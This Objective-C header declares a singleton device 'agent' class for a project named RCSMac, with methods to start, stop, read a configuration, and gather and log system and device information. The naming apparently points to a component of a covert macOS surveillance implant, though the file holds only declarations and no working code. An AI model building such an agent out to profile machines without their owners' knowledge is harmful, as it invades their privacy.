//
//  RCSMAgentDevice.h
//  RCSMac
//
//  Created by kiodo on 3/11/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "RCSMLogManager.h"

@interface RCSMAgentDevice : NSObject 
{    
@private
  NSMutableDictionary *mAgentConfiguration;
}

+ (RCSMAgentDevice *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration;
- (NSMutableDictionary *)mAgentConfiguration;
- (BOOL)stop;
- (void)start;
- (BOOL)writeDeviceInfo: (NSData*)aInfo;
- (BOOL)getDeviceInfo;
- (NSData*)getSystemInfoWithType:(NSString*)aType;

@end
